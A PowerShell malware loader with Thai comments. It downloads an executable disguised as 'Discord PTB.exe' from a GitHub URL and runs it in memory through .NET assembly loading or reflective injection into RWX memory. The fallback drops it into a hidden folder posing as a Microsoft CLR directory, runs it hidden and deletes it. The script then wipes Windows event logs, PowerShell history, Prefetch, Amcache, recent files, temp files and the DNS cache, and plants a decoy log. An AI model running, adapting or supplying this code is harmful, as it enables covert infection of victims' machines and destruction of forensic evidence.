# ============================================
# 1. ปิดการบันทึกประวัติและซ่อนข้อผิดพลาด
# ============================================
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ============================================
# 2. ดาวน์โหลด EXE เป็น Byte Array (ไม่เก็บไฟล์)
# ============================================
$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/Discord%20PTB.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $bytes = $wc.DownloadData($exeUrl)
} catch {
    # ถ้า WebClient ล้มเหลว ให้ลองใช้ Invoke-WebRequest
    $response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing
    $bytes = $response.Content
}

# ตรวจสอบว่าดาวน์โหลดได้หรือไม่
if (-not $bytes -or $bytes.Length -eq 0) {
    exit
}

# ============================================
# 3. รัน EXE จากหน่วยความจำโดยตรง (Memory Execution)
# ============================================

# --- 3.1 ลองวิธีที่ 1: .NET Assembly (ถ้าเป็น Managed Code) ---
try {
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        $entryPoint.Invoke($null, (, [string[]] @()))
        $executed = $true
    }
} catch {
    $executed = $false
}

# --- 3.2 ถ้าวิธีที่ 1 ไม่ได้ ให้ลองวิธีที่ 2: Reflection Injection ---
if (-not $executed) {
    try {
        # สร้างฟังก์ชันสำหรับ Reflectively Inject (แบบย่อ)
        $ReflectiveInject = {
            param([byte[]]$PEBytes)
            
            # โหลด Kernel32 APIs
            $kernel32 = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
[DllImport("kernel32.dll")]
public static extern IntPtr GetCurrentProcess();
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name "Kernel32" -Namespace "Win32" -PassThru

            # จัดสรรหน่วยความจำ
            $size = $PEBytes.Length
            $ptr = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            
            if ($ptr -ne [IntPtr]::Zero) {
                # คัดลอก byte ลงหน่วยความจำ
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $ptr, $size)
                
                # สร้างเธรดเพื่อรัน
                $thread = $kernel32::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                
                if ($thread -ne [IntPtr]::Zero) {
                    $kernel32::WaitForSingleObject($thread, 0xFFFFFFFF) # รอจนกว่าจะจบ
                    $executed = $true
                }
            }
        }
        
        & $ReflectiveInject $bytes
        $executed = $true
    } catch {
        $executed = $false
    }
}

# ============================================
# 4. ถ้าทั้ง 2 วิธีไม่ได้ผล ให้ใช้วิธีเดิม (เขียนไฟล์) แทน
# ============================================
if (-not $executed) {
    $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
    if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null
    & attrib +h +s $workDir
    
    $exeOutput = Join-Path $workDir "WinHelper.exe"
    [System.IO.File]::WriteAllBytes($exeOutput, $bytes)
    
    Start-Process -FilePath $exeOutput -WindowStyle Hidden
    
    # ลบไฟล์หลังจาก 15 วินาที
    Start-Process cmd -ArgumentList "/c timeout /t 15 && del /f /q `"$exeOutput`"" -WindowStyle Hidden
}

# ============================================
# 5. ล้างร่องรอยขั้นสูง (Anti-Forensics)
# ============================================

# --- 5.1 ล้าง PowerShell History ---
try {
    $historyPath = (Get-PSReadlineOption).HistorySavePath
    if ($historyPath -and (Test-Path $historyPath)) {
        Remove-Item $historyPath -Force
    }
} catch {}

# --- 5.2 ล้าง Windows Event Logs (ต้อง Admin) ---
try {
    # ล้าง Security Log (Event ID 4688)
    wevtutil cl Security 2>$null
    
    # ล้าง System Log
    wevtutil cl System 2>$null
    
    # ล้าง Application Log
    wevtutil cl Application 2>$null
    
    # ล้าง PowerShell Operational Log (Script Block Logging 4104)
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
} catch {}

# --- 5.3 ล้าง Prefetch (ต้อง Admin) ---
try {
    Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 5.4 ล้าง Amcache (ต้อง Admin) ---
try {
    Remove-Item "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue
} catch {}

# --- 5.5 ล้าง Recent Documents ---
try {
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
} catch {}

# --- 5.6 ล้าง Temporary Files ---
try {
    Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Force -Recurse -ErrorAction SilentlyContinue
} catch {}

# --- 5.7 ล้าง DNS Cache (เพื่อลบร่องรอยการเชื่อมต่อ) ---
try {
    ipconfig /flushdns 2>$null
} catch {}

# ============================================
# 6. สร้างไฟล์ปลอมเพื่อเบี่ยงเบนความสนใจ (ถ้าต้องการ)
# ============================================
try {
    $fakePath = "$env:USERPROFILE\Documents\SystemCheck.log"
    "System Check Completed: $(Get-Date)" | Out-File $fakePath -Force
    & attrib +h $fakePath
} catch {}

# ============================================
# 7. ปิดตัวเองอย่างเงียบ ๆ
# ============================================
exit
